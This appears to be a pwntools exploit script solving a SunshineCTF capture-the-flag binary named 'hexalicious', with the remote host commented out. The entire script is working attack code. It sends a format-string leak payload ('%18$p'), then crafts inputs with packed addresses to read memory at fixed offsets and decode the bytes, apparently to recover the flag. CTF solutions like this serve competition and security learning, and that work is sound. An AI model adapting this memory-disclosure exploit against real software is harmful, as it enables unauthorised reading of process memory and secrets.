from pwn import *
import sys
r = process(["./hexalicious"])

#r = remote("chal1.sunshinectf.org", 20003)

r.sendlineafter("?","%18$p")

for i in range(10):
	r.sendlineafter("[>]","0")
	r.sendlineafter("[>]","0x0"+hex(0x804B080+i*8)[2:]+"  "+p32(0x804B0E4))
	r.recvuntil("this: ")
	sol = r.recvline()[2:-1]
	sol = "0"*(len(sol)%2)+sol
	sys.stdout.write(sol.decode("hex")[::-1])

print ""
r.sendlineafter("[>]","11")
r.close()
